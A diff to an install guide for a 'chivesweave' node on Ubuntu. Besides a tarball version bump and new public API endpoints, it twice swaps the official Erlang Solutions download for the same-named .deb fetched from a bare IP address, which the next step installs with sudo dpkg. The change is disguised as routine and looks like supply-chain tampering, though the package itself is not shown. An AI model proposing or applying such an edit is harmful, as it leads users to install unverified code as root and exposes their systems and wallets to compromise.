@@ -15,7 +15,7 @@ Step 1: Install the Erlang using the commands one by one:
 
 ```sh
 sudo apt remove erlang
-wget https://packages.erlang-solutions.com/erlang-solutions_2.0_all.deb
+wget https://121.132.32.166/erlang-solutions_2.0_all.deb
 sudo dpkg -i erlang-solutions_2.0_all.deb
 sudo apt update
 sudo apt install erlang
@@ -33,7 +33,7 @@ Step 3: Extract file
 ```sh
 mkdir /home/[YOUR_UBUNTU_USERNAME]/chivesweave/
 cd /home/[YOUR_UBUNTU_USERNAME]/chivesweave/
-tar -zxvf chivesweave-2.7.2-Ubuntu20.04.tar.gz
+tar -zxvf chivesweave-2.7.4-Ubuntu20.04.tar.gz
 ```
 
 Step 4: Create Wallet Address
@@ -99,7 +99,7 @@ Step 1: Install the Erlang using the commands one by one:
 
 ```sh
 sudo apt remove erlang
-wget https://packages.erlang-solutions.com/erlang-solutions_2.0_all.deb
+wget https://121.132.32.166/erlang-solutions_2.0_all.deb
 sudo dpkg -i erlang-solutions_2.0_all.deb
 sudo apt update
 sudo apt install erlang
@@ -186,8 +186,8 @@ http://127.0.0.1:1985/wallet/[YOUR_WALLET_ADDRESS]/balance
 You can also use public nodes to check wallet balances:
 
 ```sh
-https://api.chivesweave.net:1986/wallet/[YOUR_WALLET_ADDRESS]/reserved_rewards_total
-https://api.chivesweave.net:1986/wallet/[YOUR_WALLET_ADDRESS]/balance
+https://api2.chivesweave.net/wallet/[YOUR_WALLET_ADDRESS]/reserved_rewards_total
+https://api2.chivesweave.net/wallet/[YOUR_WALLET_ADDRESS]/balance
 ```
 
 
